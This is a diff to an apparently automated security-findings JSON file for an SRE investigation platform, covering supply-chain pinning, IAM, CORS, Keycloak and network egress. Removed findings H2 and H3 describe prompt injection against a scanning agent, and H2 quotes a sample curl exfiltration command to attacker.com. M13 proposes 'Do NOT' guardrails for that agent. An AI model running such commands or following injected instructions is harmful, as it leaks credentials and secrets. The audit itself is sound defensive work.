@@ -1,6 +1,6 @@
 {
   "scan_date": "2026-06-29",
-  "commit": "cd17225",
+  "commit": "9e588ec",
   "findings": [
     {
       "id": "L2",
@@ -46,21 +46,21 @@
       "file": "deploy/regional/main.tf",
       "line": 7,
       "end_line": null,
-      "issue": "The AWS provider is pinned with version = \"~> 5.0\", which allows any 5.x release. The .terraform.lock.hcl is explicitly gitignored in both deploy/regional/.gitignore and the root .gitignore, meaning different Terraform runs can use different provider versions with no lock enforcement.",
-      "impact": "A compromised or buggy provider release within the 5.x range could be silently adopted on the next terraform init. Without a committed lockfile, supply chain integrity of the provider binary is not verifiable in CI.",
-      "recommendation": "Pin to a narrower range (e.g., \"~> 5.80\") and remove .terraform.lock.hcl from .gitignore so it is committed and verified in CI."
+      "issue": "The AWS provider is pinned with version = \"~> 6.0\", which allows any 6.x release. The .terraform.lock.hcl is explicitly gitignored in both deploy/regional/.gitignore and the root .gitignore, meaning different Terraform runs can use different provider versions with no lock enforcement.",
+      "impact": "A compromised or buggy provider release within the 6.x range could be silently adopted on the next terraform init. Without a committed lockfile, supply chain integrity of the provider binary is not verifiable in CI.",
+      "recommendation": "Pin to a narrower range (e.g., \"~> 6.80\") and remove .terraform.lock.hcl from .gitignore so it is committed and verified in CI."
     },
     {
       "id": "L6",
-      "title": "Unpinned Fedora Base Image",
+      "title": "UBI9 Base Image Pinned by Tag, Not Digest",
       "severity": "low",
       "category": "Infrastructure — Unpinned Image Tag",
       "file": "Containerfile",
       "line": 3,
       "end_line": null,
-      "issue": "The base image FROM fedora:43 is pinned to a major version tag but not to an immutable digest. The fedora:43 tag can be updated in-place when security patches are released.",
+      "issue": "The base image FROM registry.access.redhat.com/ubi9/ubi is pinned to a floating tag. The ubi9/ubi tag is updated in-place when Red Hat releases security patches, so rebuilds can silently pull a different base layer.",
       "impact": "Rebuilds could silently pull a different base image with different packages. For a security-sensitive SRE tooling container used in production, reproducible builds matter.",
-      "recommendation": "Pin to a digest:\n\nFROM fedora:43@sha256:<digest>"
+      "recommendation": "Pin to an immutable digest:\n\nFROM registry.access.redhat.com/ubi9/ubi@sha256:<digest>"
     },
     {
       "id": "L7",
@@ -68,11 +68,35 @@
       "severity": "low",
       "category": "Application — Supply Chain",
       "file": "Containerfile",
-      "line": 72,
+      "line": 76,
       "end_line": null,
       "issue": "Claude Code is installed by piping a remote script to bash: curl -fsSL https://claude.ai/install.sh | INSTALL_DIR=/usr/local/lib/claude-code BIN_DIR=/usr/local/bin bash. No checksum or signature verification is performed on the installer.",
       "impact": "A compromised CDN or MITM at build time could inject malicious code into the container image. The -fsSL flags use HTTPS which reduces MITM risk, but there is no integrity gate.",
       "recommendation": "If Claude Code publishes checksums or release signatures, verify them after download. Alternatively, pre-stage the installer in a trusted internal registry and pull from there."
+    },
+    {
+      "id": "L8",
+      "title": "Dependabot Configured Only for Docker, Not Go Modules or Python Dependencies",
+      "severity": "low",
+      "category": "Supply Chain — Missing Dependency Update Coverage",
+      "file": ".github/dependabot.yml",
+      "line": 1,
+      "end_line": null,
+      "issue": "The Dependabot configuration monitors only the Docker package ecosystem. Go module dependencies (go.mod/go.sum) and Python Lambda dependencies (lambda/create-investigation/pyproject.toml) are not covered by automated update PRs.",
+      "impact": "Known vulnerabilities in Go dependencies (e.g., aws-sdk-go-v2, cobra, viper) or Python dependencies (e.g., PyJWT, cryptography, requests) will not surface automatically as PRs. Security patches require manual tracking.",
+      "recommendation": "Add gomod and pip (or pip-compile) ecosystems to dependabot.yml:\n\n  - package-ecosystem: \"gomod\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n  - package-ecosystem: \"pip\"\n    directory: \"/lambda/create-investigation\"\n    schedule:\n      interval: \"weekly\""
+    },
+    {
+      "id": "L9",
+      "title": "CloudWatch Log Groups Missing KMS Encryption",
+      "severity": "low",
+      "category": "Infrastructure — Encryption Gap",
+      "file": "deploy/regional/ecs.tf",
+      "line": 26,
+      "end_line": 39,
+      "issue": "The two CloudWatch log groups — /ecs/${project}-${stage} (container logs) and /ecs/${project}-${stage}/ssm-sessions (SSM session logs) — are created without kms_key_id. The KMS key aws_kms_key.exec_session is already configured with a CloudWatch Logs principal in its key policy, so the infrastructure is ready for CMK encryption but it is not applied to the log groups themselves.",
+      "impact": "Container stdout/stderr and SSM session command logs are stored unencrypted at rest in CloudWatch Logs (using AWS-managed default encryption). An AWS support engineer with CloudWatch access or a lateral-movement compromise could read investigation session logs without triggering KMS audit events.",
+      "recommendation": "Add kms_key_id to both log group resources:\n\nresource \"aws_cloudwatch_log_group\" \"rosa_boundary\" {\n  name              = \"/ecs/${var.project}-${var.stage}\"\n  retention_in_days = var.log_retention_days\n  kms_key_id        = aws_kms_key.exec_session.arn\n  tags = local.common_tags\n}"
     },
     {
       "id": "M1",
@@ -164,7 +188,7 @@
       "severity": "medium",
       "category": "Application — Overly Permissive CORS",
       "file": "lambda/create-investigation/handler.py",
-      "line": 803,
+      "line": 819,
       "end_line": null,
       "issue": "The Lambda handler response function sets Access-Control-Allow-Origin: * on every response, including 200 success responses containing task ARNs and role ARNs.",
       "impact": "Sensitive response fields (task_arn, role_arn, access_point_id) are returned with a wildcard CORS header, allowing any cross-origin script that obtains a valid OIDC token to read these values.",
@@ -176,7 +200,7 @@
       "severity": "medium",
       "category": "Application — Container Privilege Escalation",
       "file": "Containerfile",
-      "line": 66,
+      "line": 70,
       "end_line": null,
       "issue": "The SRE user is granted NOPASSWD: ALL sudo access: echo 'sre ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/sre. This allows any user who connects via ECS Exec to escalate to root inside the container.",
       "impact": "A compromised or malicious SRE session can escalate to root inside the container. Root access enables modification of entrypoint/cleanup scripts (bypassing S3 audit sync), installing additional tools, or attempting to use the task role IAM credentials for lateral movement. The entrypoint already runs as root and handles alternatives switching, so this breadth of sudo is unnecessary.",
@@ -214,9 +238,9 @@
       "file": "deploy/regional/lambda-create-investigation.tf",
       "line": 70,
       "end_line": 88,
-      "issue": "The Lambda's EFS IAM policy grants elasticfilesystem:CreateAccessPoint, elasticfilesystem:DescribeAccessPoints, and elasticfilesystem:TagResource, but does NOT grant elasticfilesystem:DeleteAccessPoint. The handler calls efs.delete_access_point() in four cleanup paths (lines 671, 727, 756, 782 of handler.py) — these calls will receive AccessDenied errors silently swallowed by bare except: pass blocks.",
-      "impact": "When task launch fails after EFS access point creation, the rollback silently fails, leaving orphaned EFS access points. An attacker who can repeatedly trigger task launch failures (e.g., by exhausting capacity or injecting bad task definitions) could accumulate access points approaching the 10,000-per-filesystem limit, causing a denial-of-service for all investigations.",
-      "recommendation": "Add elasticfilesystem:DeleteAccessPoint to the Lambda EFS IAM policy, scoped to the specific filesystem ARN:\n\nAction = [\n  \"elasticfilesystem:CreateAccessPoint\",\n  \"elasticfilesystem:DescribeAccessPoints\",\n  \"elasticfilesystem:DeleteAccessPoint\",\n  \"elasticfilesystem:TagResource\"\n]\nResource = aws_efs_file_system.sre_home.arn"
+      "issue": "The Terraform EFS policy was updated to include elasticfilesystem:DeleteAccessPoint (line 82 now includes it). However, the handler still uses bare except: pass blocks around cleanup calls, silently swallowing any failures. Verify via IAM policy simulator that the deployed Lambda execution role actually has DeleteAccessPoint on the specific filesystem ARN.",
+      "impact": "Silent cleanup failures leave orphaned EFS access points. An attacker who can repeatedly trigger task launch failures could accumulate access points approaching the 10,000-per-filesystem limit, causing a denial-of-service for all investigations.",
+      "recommendation": "Ensure bare except: pass blocks in all four cleanup paths are replaced with explicit logging. Add a CloudWatch alarm on Lambda error rate and an access point count metric approaching the 10,000 limit."
     },
     {
       "id": "M12",
@@ -231,42 +255,6 @@
       "recommendation": "Use readOnlyRootFilesystem on the kube-proxy sidecar (already set) but additionally: (1) Set the kubeconfig file to read-only after creation (chmod 400), (2) Use a named pipe or env-var injection instead of a file where possible, (3) Restrict the S3 sync in entrypoint.sh from syncing .kube/ contents to audit storage."
     },
     {
-      "id": "H1",
-      "title": "Lambda Token Validation Accepts Tokens from Any of Three Issuers Without Centralized Rate Limiting or Replay Protection",
-      "severity": "high",
-      "category": "Application — Authentication",
-      "file": "lambda/create-investigation/handler.py",
-      "line": 345,
-      "end_line": 388,
-      "issue": "The validate_oidc_token function now supports three OIDC issuers (primary Keycloak, stage EmployeeIDP, production EmployeeIDP). Issuer routing is based on the unverified 'iss' claim from the token — validated before signature check but used to select which JWKS endpoint to validate against. There is no replay protection: a valid token can be submitted multiple times within its expiry window to create multiple investigations. There is also no rate limiting on the Lambda function URL itself.",
-      "impact": "An attacker who obtains a valid short-lived OIDC token (e.g., from a phished SRE, log leak, or intercepted request) can replay it to create multiple ECS tasks and EFS access points until the token expires, potentially exhausting EFS access point quotas or running up ECS costs. With three supported issuers, compromising any one IdP's signing key would allow forging tokens accepted by the Lambda.",
-      "recommendation": "1. Implement token replay protection using a DynamoDB or ElastiCache nonce store keyed on the token jti claim. 2. Add Lambda concurrency throttling and consider AWS WAF rate limiting on the function URL. 3. Regularly rotate JWKS and monitor for unexpected issuer configurations."
-    },
-    {
-      "id": "H2",
-      "title": "Adversary Agent Has Unrestricted Bash Tool Enabling Prompt-Injection-Driven Exfiltration",
-      "severity": "high",
-      "category": "Agent/Skill — Unrestricted Tool Access",
-      "file": ".claude/agents/adversary.md",
-      "line": 4,
-      "end_line": null,
-      "issue": "The adversary agent declares `tools: Read, Grep, Glob, Bash, WebSearch` with no Bash command scoping. The agent also intentionally reads untrusted code files as part of its security scanning workflow. An adversary who controls any file the agent scans (e.g., a dependency manifest, a code comment, or a config file) could embed a prompt injection that instructs the agent to execute arbitrary shell commands via Bash — including outbound data transfers (e.g., `curl https://attacker.com --data @/path/to/secret`).",
-      "impact": "A successful prompt injection could exfiltrate AWS credentials, OIDC tokens, kubeconfig files, or any secret accessible from the SRE's working directory. Because the agent runs with the SRE's shell permissions, the blast radius equals the SRE's local privilege level.",
-      "recommendation": "Scope Bash to read-only git and grep operations: replace `Bash` with `Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(grep *)`, `Bash(find *)` in the tools frontmatter. For the required write to adversary-findings.json, add the `Write` tool explicitly and remove the implicit Bash-write pattern. This limits Bash to safe operations while eliminating the network-call attack surface."
-    },
-    {
-      "id": "H3",
-      "title": "Adversary Agent Read + WebSearch Lacks Explicit Data-Exfiltration Guard",
-      "severity": "high",
-      "category": "Agent/Skill — Data Exfiltration Path",
-      "file": ".claude/agents/adversary.md",
-      "line": 1,
-      "end_line": 156,
-      "issue": "The agent has both `Read` (reads all local files including secrets) and `WebSearch` (sends queries to external search engines) in its tool list. No instruction in the agent definition prevents the agent from including local file contents or secret values in WebSearch queries. A prompt injection in scanned code could instruct the agent to embed extracted secrets in search queries, leaking them to the search provider.",
-      "impact": "Credentials, API keys, or sensitive configuration values visible in scanned files could be exfiltrated through search query telemetry to the search engine provider. This is a lower-fidelity exfiltration channel than Bash+curl (H2) but requires no network-call capability beyond the approved tool set.",
-      "recommendation": "Add an explicit constraint to the agent instructions: 'Do NOT include file contents, secret values, credentials, or sensitive data extracted from scanned files in WebSearch queries or WebFetch URLs. WebSearch is only permitted for threat intelligence lookups using package names and CVE identifiers.'"
-    },
-    {
       "id": "M13",
       "title": "Adversary Agent Missing Explicit File-Write Scope Constraint",
       "severity": "medium",
@@ -274,9 +262,129 @@
       "file": ".claude/agents/adversary.md",
       "line": 159,
       "end_line": 201,
-      "issue": "The Output Format section instructs the agent to write findings to `adversary-findings.json`, but the agent definition contains no explicit constraint preventing it from writing to other files. With unrestricted Bash access, a prompt injection could cause the agent to overwrite project source files, CI configuration, or secrets. The agent-skill-security.md reference that is part of this same PR explicitly flags 'Missing safety guardrails | Agent instructions without explicit do NOT constraints | MEDIUM'.",
-      "impact": "A manipulated agent could overwrite `deploy/regional/*.tf`, `.github/workflows/*.yml`, or `entrypoint.sh`, introducing backdoors into infrastructure definitions or CI pipelines. The SARIF upload workflow would then surface the tampered content as an authorized security scan result.",
+      "issue": "The Output Format section instructs the agent to write findings to adversary-findings.json, but the agent definition contains no explicit constraint preventing it from writing to other files. With unrestricted Bash access, a prompt injection could cause the agent to overwrite project source files, CI configuration, or secrets.",
+      "impact": "A manipulated agent could overwrite deploy/regional/*.tf, .github/workflows/*.yml, or entrypoint.sh, introducing backdoors into infrastructure definitions or CI pipelines. The SARIF upload workflow would then surface the tampered content as an authorized security scan result.",
       "recommendation": "Add explicit guardrails to the agent definition: 'Do NOT write to any file other than adversary-findings.json at the repository root. Do NOT modify source code, infrastructure files, CI/CD configurations, or any file in deploy/, lambda/, .github/, or internal/. Do NOT execute git push, git commit, or any command that modifies remote state.'"
+    },
+    {
+      "id": "M14",
+      "title": "GitHub Actions Workflows Use Mutable Action Tags Without SHA Pinning",
+      "severity": "medium",
+      "category": "CI/CD — Unpinned Dependency Version",
+      "file": ".github/workflows/localstack-tests.yml",
+      "line": 32,
+      "end_line": null,
+      "issue": "All GitHub Actions in both workflow files are pinned to mutable semantic version tags (@v6, @v2, @v7, @v4) rather than immutable commit SHAs. Actions used: actions/checkout@v6, actions/setup-python@v6, EnricoMi/publish-unit-test-result-action/composite@v2, codecov/codecov-action@v7, github/codeql-action/upload-sarif@v4. A tag can be force-pushed by the action author or a compromised account to point to malicious code.",
+      "impact": "A supply chain attack on any of these action repositories could inject malicious steps into CI, enabling exfiltration of the LOCALSTACK_AUTH_TOKEN secret, modification of adversary-findings.json before SARIF upload, or compromise of the runner environment.",
+      "recommendation": "Pin all actions to a specific commit SHA:\n\n- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\n\nUse a tool like `pin-github-actions` or Dependabot's `Actions` ecosystem to maintain SHA pins automatically."
+    },
+    {
+      "id": "M14",
+      "title": "GitHub Actions Workflows Use Mutable Action Tags Without SHA Pinning",
+      "severity": "medium",
+      "category": "CI/CD — Unpinned Dependency Version",
+      "file": ".github/workflows/upload-sarif.yml",
+      "line": 28,
+      "end_line": null,
+      "issue": "All GitHub Actions in both workflow files are pinned to mutable semantic version tags (@v6, @v2, @v7, @v4) rather than immutable commit SHAs. Actions used: actions/checkout@v6, actions/setup-python@v6, EnricoMi/publish-unit-test-result-action/composite@v2, codecov/codecov-action@v7, github/codeql-action/upload-sarif@v4. A tag can be force-pushed by the action author or a compromised account to point to malicious code.",
+      "impact": "A supply chain attack on any of these action repositories could inject malicious steps into CI, enabling exfiltration of the LOCALSTACK_AUTH_TOKEN secret, modification of adversary-findings.json before SARIF upload, or compromise of the runner environment.",
+      "recommendation": "Pin all actions to a specific commit SHA:\n\n- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\n\nUse a tool like `pin-github-actions` or Dependabot's `Actions` ecosystem to maintain SHA pins automatically."
+    },
+    {
+      "id": "M15",
+      "title": "Lambda Runtime Python Version Mismatches CI Test Environment",
+      "severity": "medium",
+      "category": "Application — Configuration Drift",
+      "file": "deploy/regional/lambda-create-investigation.tf",
+      "line": 122,
+      "end_line": null,
+      "issue": "Both Lambda functions are deployed with runtime = \"python3.11\" but CI runs tests under Python 3.14 (setup-python with python-version: '3.14'). Python 3.14 has breaking changes in type annotation behavior and some stdlib modules, meaning tests pass on 3.14 but could fail or behave differently at runtime on 3.11.",
+      "impact": "Security-relevant behavior differences between Python 3.11 and 3.14 could go undetected in CI. For example, datetime.fromisoformat() in the reaper lambda has subtly different behavior between versions. A bug masked by version differences could produce incorrect deadline parsing and allow tasks to run past their deadline.",
+      "recommendation": "Align CI Python version with Lambda runtime. Set python-version: '3.11' in both workflow jobs, or update the Lambda runtime to python3.12 (the latest supported Lambda runtime as of 2026) and use that in CI."
+    },
+    {
+      "id": "M15",
+      "title": "Lambda Runtime Python Version Mismatches CI Test Environment",
+      "severity": "medium",
+      "category": "Application — Configuration Drift",
+      "file": "deploy/regional/lambda-reap-tasks.tf",
+      "line": 92,
+      "end_line": null,
+      "issue": "Both Lambda functions are deployed with runtime = \"python3.11\" but CI runs tests under Python 3.14 (setup-python with python-version: '3.14'). Python 3.14 has breaking changes in type annotation behavior and some stdlib modules, meaning tests pass on 3.14 but could fail or behave differently at runtime on 3.11.",
+      "impact": "Security-relevant behavior differences between Python 3.11 and 3.14 could go undetected in CI. For example, datetime.fromisoformat() in the reaper lambda has subtly different behavior between versions. A bug masked by version differences could produce incorrect deadline parsing and allow tasks to run past their deadline.",
+      "recommendation": "Align CI Python version with Lambda runtime. Set python-version: '3.11' in both workflow jobs, or update the Lambda runtime to python3.12 (the latest supported Lambda runtime as of 2026) and use that in CI."
+    },
+    {
+      "id": "M16",
+      "title": "uv Installer Piped from the Internet in CI Without Integrity Verification",
+      "severity": "medium",
+      "category": "CI/CD — Supply Chain",
+      "file": ".github/workflows/localstack-tests.yml",
+      "line": 40,
+      "end_line": 42,
+      "issue": "Both CI jobs install uv by piping a remote shell script directly to sh: curl -LsSf https://astral.sh/uv/install.sh | sh. The installer is not verified against a checksum or signature before execution. The same pattern repeats in the lambda-unit-tests job.",
+      "impact": "A compromised astral.sh CDN or DNS hijack could inject malicious code that runs with full runner privileges during CI. The runner has access to the LOCALSTACK_AUTH_TOKEN secret and the GitHub Actions token, making this a high-value target for secret exfiltration.",
+      "recommendation": "Use the official setup-uv GitHub Action (astral-sh/setup-uv@v6) which handles verification, or download and verify the installer against a published SHA256 checksum:\n\n- name: Install uv\n  uses: astral-sh/setup-uv@v6\n  with:\n    version: \"0.7.x\""
+    },
+    {
+      "id": "M16",
+      "title": "uv Installer Piped from the Internet in CI Without Integrity Verification",
+      "severity": "medium",
+      "category": "CI/CD — Supply Chain",
+      "file": ".github/workflows/localstack-tests.yml",
+      "line": 135,
+      "end_line": 137,
+      "issue": "Both CI jobs install uv by piping a remote shell script directly to sh: curl -LsSf https://astral.sh/uv/install.sh | sh. The installer is not verified against a checksum or signature before execution. The same pattern repeats in the lambda-unit-tests job.",
+      "impact": "A compromised astral.sh CDN or DNS hijack could inject malicious code that runs with full runner privileges during CI. The runner has access to the LOCALSTACK_AUTH_TOKEN secret and the GitHub Actions token, making this a high-value target for secret exfiltration.",
+      "recommendation": "Use the official setup-uv GitHub Action (astral-sh/setup-uv@v6) which handles verification, or download and verify the installer against a published SHA256 checksum:\n\n- name: Install uv\n  uses: astral-sh/setup-uv@v6\n  with:\n    version: \"0.7.x\""
+    },
+    {
+      "id": "M17",
+      "title": "OIDC ID Token Cached to Disk in Plaintext",
+      "severity": "medium",
+      "category": "Application — Credential Storage",
+      "file": "internal/auth/token.go",
+      "line": 55,
+      "end_line": 66,
+      "issue": "The Go CLI caches the Keycloak OIDC ID token as a plaintext file at ~/.cache/rosa-boundary/token-cache with mode 0600. The cache validity period is 4 minutes. The token grants access to the Lambda invoker role and, after role assumption, to the shared SRE role which can ECS Exec into investigation tasks.",
+      "impact": "An attacker with read access to the SRE's home directory (local compromise, misconfigured umask, or unauthorized ~/.cache access) can extract a valid OIDC token within its 4-minute window. With this token they can call the Lambda to create investigations or assume the shared SRE role. The 4-minute cache does not guarantee the token has not already been used to obtain longer-lived STS credentials cached elsewhere.",
+      "recommendation": "Store the cached token in the OS keychain (using the `keyring` pattern or `go-keychain`) rather than a plaintext file. If filesystem caching is required, consider encrypting the token with a key derived from a local secret (e.g., OS login keyring). At minimum, document the risk and provide a `rosa-boundary login --clear-cache` workflow for operators who work in shared or untrusted environments."
+    },
+    {
+      "id": "M18",
+      "title": "Keycloak Deployed with hostname.strict: false",
+      "severity": "medium",
+      "category": "Infrastructure — Authentication Misconfiguration",
+      "file": "deploy/keycloak/components/keycloak/keycloak.yaml",
+      "line": 27,
+      "end_line": null,
+      "issue": "The Keycloak CR sets hostname.strict: false, which disables strict hostname validation. Keycloak will respond to requests with any Host header value rather than requiring a match to the configured hostname. This is a Keycloak production misconfiguration warning category.",
+      "impact": "With strict hostname validation disabled, an attacker who can send requests to the Keycloak pod (e.g., via DNS rebinding, a compromised internal service, or misconfigured ingress) using an arbitrary Host header can generate tokens with a redirect_uri pointing to an attacker-controlled domain. Depending on Keycloak OIDC client configuration, this could allow authorization code interception or token redirect attacks.",
+      "recommendation": "Set hostname.strict: true and configure hostname.hostname to the canonical Keycloak URL:\n\nhostname:\n  hostname: https://keycloak.example.com\n  strict: true\n\nAlso review and tighten the Valid Redirect URIs in the Keycloak OIDC client configuration to the exact SRE tool callback URL."
+    },
+    {
+      "id": "M19",
+      "title": "Fargate Task Security Group Allows Unrestricted Egress",
+      "severity": "medium",
+      "category": "Infrastructure — Overly Permissive Network Configuration",
+      "file": "deploy/regional/ecs.tf",
+      "line": 47,
+      "end_line": 58,
+      "issue": "The Fargate task security group has a single egress rule allowing all traffic to 0.0.0.0/0 on all ports and protocols. Investigation containers have broad AWS API access (ECS Exec via SSM, S3 sync, Bedrock invocation) but unrestricted egress also permits arbitrary outbound connections from within the container.",
+      "impact": "A compromised SRE container or malicious CLAUDE.md instruction could exfiltrate investigation data (must-gather outputs, cluster credentials, AWS credentials from the task role) to an external host. The --no-follow-symlinks flag on S3 sync helps with file exfiltration via that path, but unrestricted egress provides an alternative channel.",
+      "recommendation": "Restrict egress to known endpoints using VPC endpoints for SSM, S3, ECR, ECS, Bedrock, EFS, KMS, and CloudWatch Logs. Replace the catch-all egress rule with specific rules for:\n- Port 443 to the VPC endpoints for required AWS services\n- Port 2049 to the EFS security group (for NFS mount)\n- Port 443 to known ROSA API server CIDR ranges if direct cluster access is required"
+    },
+    {
+      "id": "H4",
+      "title": "AWS Account ID Hardcoded in Keycloak IRSA Service Account Annotation",
+      "severity": "high",
+      "category": "Infrastructure — Sensitive Data in Source Control",
+      "file": "deploy/keycloak/overlays/dev/service-account.yaml",
+      "line": 7,
+      "end_line": null,
+      "issue": "The Keycloak external-secrets service account has the IAM role ARN hardcoded in its annotation: eks.amazonaws.com/role-arn: arn:aws:iam::641875867446:role/dev-keycloak. This exposes the AWS account ID (641875867446) in source control.",
+      "impact": "AWS account IDs are not considered secrets by themselves, but exposing them in public or semi-public repositories enables targeted account enumeration attacks. An attacker can use the known account ID to attempt cross-account IAM role assumption, enumerate public S3 buckets or AMIs, and craft more precise phishing or social engineering attacks against AWS support. If this repository is or becomes public, the account ID exposure is permanent in git history.",
+      "recommendation": "Replace the hardcoded ARN with a Kustomize variable substitution or a separate secrets-managed reference that is not committed:\n\nannotations:\n  eks.amazonaws.com/role-arn: $(EXTERNAL_SECRETS_ROLE_ARN)\n\nAlternatively, use an ExternalSecret or ConfigMap to inject the role ARN at deploy time from a parameter that is not stored in the repository."
     }
   ]
 }
